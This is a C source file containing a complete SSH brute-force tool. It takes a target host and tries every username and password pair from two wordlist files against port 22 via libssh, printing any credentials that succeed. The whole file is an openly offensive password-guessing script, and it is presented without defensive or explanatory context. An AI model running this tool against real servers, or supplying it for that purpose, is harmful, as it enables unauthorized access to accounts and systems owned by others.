#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string.h>
#include <libssh/libssh.h>

#define USER "users.txt"
#define PASS "words.txt"
#define PORT 22

int main(int argc, char *argv[])
{
  FILE *fd1, *fd2;
  char login[250], pass[250];
  char *buf;
  struct hostent* host;
  struct sockaddr_in servaddr;
  
  SSH_SESSION *ssh_session;
  SSH_OPTIONS *ssh_opt;

  if (argc != 2) {
    fprintf(stderr, "Usage: %s <target>\n", argv[0]);
    exit(-1);
  }
  
  fprintf(stderr, "Brute start...\n");

  if ( (host = gethostbyname(argv[1])) == NULL) {
    herror("gethostbyname() failed");
    exit(-1);
  }

  bzero(&servaddr, sizeof(servaddr));
  servaddr.sin_family = AF_INET;
  servaddr.sin_port = htons(PORT);
  servaddr.sin_addr = *((struct in_addr *)host->h_addr);

  if ( (fd1 = fopen(USER, "r")) == NULL) {
    perror("fopen() failed");
    exit(-1);
  }

  while(fgets(login, 250, fd1) != NULL)
  {
    login[strcspn(login, "\r\n\t")] = 0;
    if (strlen(login) == 0) continue;

    if( (fd2 = fopen(PASS, "r")) == NULL) {
      perror("fopen() failed");
      exit(-1);
    }

    while(fgets(pass, 250, fd2) != NULL)
    {
      pass[strcspn(pass, "\r\n\t")] = 0;
      if (strlen(pass) == 0) continue;

      ssh_opt = options_new();
      buf = malloc(20);
      inet_ntop(AF_INET, &servaddr.sin_addr, buf, 20);
      options_set_wanted_method(ssh_opt, KEX_COMP_C_S, "none");
      options_set_wanted_method(ssh_opt, KEX_COMP_S_C, "none");
      options_set_port(ssh_opt, PORT);
      options_set_host(ssh_opt, buf);
      options_set_username(ssh_opt, login);
      if ((ssh_session = ssh_connect(ssh_opt)) == NULL) {
        fprintf(stderr, "Connection failed: %s\n", ssh_get_error(ssh_session)); 
        exit(-1);
      }
           
      if (ssh_userauth_password(ssh_session, login, pass) == SSH_AUTH_SUCCESS) {
        fprintf(stderr, "OK! login: %s, password: %s\n", login, pass);
      }

      free(buf);
      ssh_disconnect(ssh_session);
    }
  }
  
  return 0;
}

